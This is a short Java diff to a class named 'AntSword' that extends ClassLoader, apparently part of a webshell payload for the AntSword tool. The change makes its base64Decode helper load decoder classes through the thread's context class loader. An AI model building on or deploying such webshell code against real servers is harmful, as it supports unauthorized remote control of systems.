@@ -40,11 +40,12 @@ public class AntSword extends ClassLoader {
 
     @SuppressWarnings("all")
     public static byte[] base64Decode(String bs) throws Exception {
+        ClassLoader loader = Thread.currentThread().getContextClassLoader();
         try {
-            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
+            Object decoder = Class.forName("java.util.Base64", false, loader).getMethod("getDecoder").invoke(null);
             return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
         } catch (Exception var6) {
-            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
+            Object decoder = Class.forName("sun.misc.BASE64Decoder", false, loader).newInstance();
             return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
         }
     }
